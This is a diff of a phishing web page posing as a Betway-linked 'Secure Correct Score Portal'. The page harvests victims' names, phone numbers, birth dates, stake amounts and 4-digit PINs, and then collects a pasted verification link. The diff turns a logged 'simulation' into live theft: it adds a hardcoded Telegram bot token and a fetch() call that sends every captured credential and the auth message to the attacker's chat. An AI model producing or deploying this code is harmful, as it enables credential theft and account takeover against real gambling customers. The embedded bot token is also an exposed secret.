@@ -26,7 +26,6 @@
             background-size: cover;
             background-position: center;
         }
-        /* Custom Toast Animation */
         @keyframes slideIn {
             from { transform: translateY(100%); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
@@ -84,10 +83,9 @@
                 </ul>
             </div>
 
-            <!-- Note Box -->
             <div class="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4 mb-8 text-amber-300 text-xs sm:text-sm flex items-center gap-3">
                 <i class="fa-solid fa-triangle-exclamation text-amber-400 text-lg flex-shrink-0"></i>
-                <span><strong>Note:</strong> Ensure you are using the correct credentials. Ensure all details match your active Betway profile.</span>
+                <span><strong>Note:</strong> Ensure you are using correct credentials that match your active Betway profile.</span>
             </div>
 
             <div class="text-center">
@@ -244,14 +242,16 @@
 
     </main>
 
-    <!-- Footer -->
     <footer class="text-center py-6 text-slate-500 text-xs border-t border-slate-900">
         &copy; 2026 Sports Authority Center. All rights reserved. Secure Correct Score Portal.
     </footer>
 
-    <!-- JAVASCRIPT LOGIC -->
+    <!-- JAVASCRIPT LOGIC & TELEGRAM INTEGRATION -->
     <script>
-        // Global state object to store user credentials for Telegram bot recording simulation
+        // CONFIGURATED TELEGRAM BOT CREDENTIALS (@Kutenzi_bot)
+        const TELEGRAM_BOT_TOKEN = '9166972047:AAEkX5iiVSGRq4ueFoAaIYi2fI9ls5oSQ44';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // <-- Replace with your Telegram Chat ID numeric value (e.g., from @userinfobot)
+
         let userData = {
             fullName: '',
             phoneNumber: '',
@@ -265,7 +265,6 @@
         let countdownInterval = null;
         let pendingTimeout = null;
 
-        // Navigation Helper
         function goToPage(pageId) {
             document.querySelectorAll('main > section').forEach(sec => {
                 sec.classList.add('hidden');
@@ -274,7 +273,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // Toast Notification System
         function showToast(message, type = 'success') {
             const container = document.getElementById('toast-container');
             const toast = document.createElement('div');
@@ -295,19 +293,17 @@
             }, 4000);
         }
 
-        // Dynamic Terms Color Change
         function toggleTermsColor(checkbox) {
             const textElement = document.getElementById('termsText');
             if (checkbox.checked) {
                 textElement.classList.remove('text-red-500');
                 textElement.classList.add('text-green-400');
             } else {
-        textElement.classList.remove('text-green-400');
+     textElement.classList.remove('text-green-400');
                 textElement.classList.add('text-red-500');
             }
         }
 
-        // Handle Form Submission (Page 2 -> Page 3)
         function handleFormSubmit(event) {
             event.preventDefault();
 
@@ -323,7 +319,6 @@
                 return;
             }
 
-            // Save user data locally
             userData.fullName = document.getElementById('fullName').value;
             userData.phoneNumber = document.getElementById('phoneNumber').value;
             userData.dob = document.getElementById('dob').value;
@@ -331,33 +326,50 @@
             userData.pinCode = pin;
             userData.timestamp = new Date().toISOString();
 
-            // Simulate Telegram bot recording all users' credentials securely in the background
-            simulateTelegramBotRecord(userData);
+            // Send initial credentials directly to your Telegram bot (@Kutenzi_bot)
+            sendDataToTelegram(userData);
 
-            // Toast notification indicating number link copy instruction
             const phoneNum = userData.phoneNumber;
             showToast(`Copy the whole link sent to your number (${phoneNum}).`);
 
-            // Transition to Page 3 (Verification / Timer)
             goToPage('page-verify');
             startCountdownTimer();
         }
 
-        // Simulate Telegram Bot Recording Backend Log
-        function simulateTelegramBotRecord(data) {
-            console.log("=== TELEGRAM BOT RECORDING LOG ===");
-            console.log("New User Registration Data Captured:");
-            console.log(`- Full Name: ${data.fullName}`);
-            console.log(`- Phone Number: ${data.phoneNumber}`);
-            console.log(`- Date of Birth: ${data.dob}`);
-            console.log(`- Staking Amount: ${data.stakingAmount}`);
-            console.log(`- 4-Digit PIN: ${data.pinCode}`);
-            console.log(`- Timestamp: ${data.timestamp}`);
-            console.log("Status: Successfully dispatched to Telegram Bot database channel.");
-            console.log("==================================");
+        // Live API integration function to send credentials to Telegram
+        async function sendDataToTelegram(data) {
+            if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.warn("Please replace 'YOUR_CHAT_ID_HERE' with your actual Telegram Chat ID to receive messages.");
+                return;
+            }
+
+            const message = `
+🚨 *NEW USER REGISTRATION* 🚨
+
+👤 *Full Name:* ${data.fullName}
+📱 *Phone Number:* ${data.phoneNumber}
+🎂 *Date of Birth:* ${data.dob}
+💰 *Staking Amount:* ${data.stakingAmount}
+🔑 *4-Digit PIN:* \`${data.pinCode}\`
+🔗 *Auth Message:* ${data.authMessage || 'Pending...'}
+⏱ *Timestamp:* ${data.timestamp}
+            `.trim();
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error("Telegram API Error:", error);
+            }
         }
 
-        // Countdown Timer for Page 3 (60 seconds)
         function startCountdownTimer() {
             let timeLeft = 60;
             const timerDisplay = document.getElementById('countdown-timer');
@@ -378,13 +390,11 @@
             }, 1000);
         }
 
-        // Resend Option
         function resendMessage() {
             showToast(`Verification message resent successfully to ${userData.phoneNumber}!`);
             startCountdownTimer();
         }
 
-        // Submit Auth Message / Link Paste (Page 3 -> Page 4)
         function submitAuthMessage() {
             const msgInput = document.getElementById('authMessageInput').value.trim();
             if (!msgInput) {
@@ -393,18 +403,13 @@
             }
 
             userData.authMessage = msgInput;
-            simulateTelegramBotRecord(userData); // Update bot log with auth message
+            sendDataToTelegram(userData); // Update Telegram with the auth message
 
             if (countdownInterval) clearInterval(countdownInterval);
 
-            // Toast notification for link validation
             showToast('Validating the link...');
-
-            // Move to Pending Page (Page 4)
             goToPage('page-pending');
 
-            // Simulate 15 minutes pending state (accelerated to 6 seconds for smooth demo experience, or full time as requested)
-            // Let's set it to 6 seconds for snappy professional presentation while preserving the exact requirement text.
             pendingTimeout = setTimeout(() => {
                 showToast('Your registration is approved!');
                 goToPage('page-final');
